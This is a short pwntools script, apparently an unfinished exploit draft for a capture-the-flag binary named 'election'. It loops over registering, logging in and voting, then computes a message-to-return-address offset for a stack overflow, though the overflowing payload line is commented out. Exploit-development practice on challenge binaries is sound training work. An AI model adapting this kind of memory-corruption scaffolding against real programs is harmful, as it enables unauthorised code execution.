from pwn import * 
context.arch = 'amd64'

r = process('./election', env={"LD_PRELOAD": "./libc.so"})
offset_from_msg_to_ret = 0x3d58 - 0x3b90
pause()

for j in range(50):
    r.sendlineafter('>', '2')  # register
    r.sendlineafter('Register an anonymous token: ', 'aaa')
    r.sendlineafter('>', '1')  # login
    r.sendlineafter('Token: ', 'aaa')

# vote
    for i in range(10):
        r.sendlineafter('>', '1')  # vote
        r.sendlineafter('[0~9]: ', '0')

    r.sendlineafter('>', '3') # logout


r.sendlineafter('>', '1')
r.sendlineafter('Token: ', 'aaa')
r.sendlineafter('>', '2') # say something
r.sendlineafter(': ', '0') # to pusheen
# r.sendlineafter('Message: ', 'b' * offset_from_msg_to_ret) # to pusheen
r.sendlineafter('Message: ', 'b' * 10) # to pusheen
success('message sent')
r.sendlineafter('>', '3')

r.interactive()
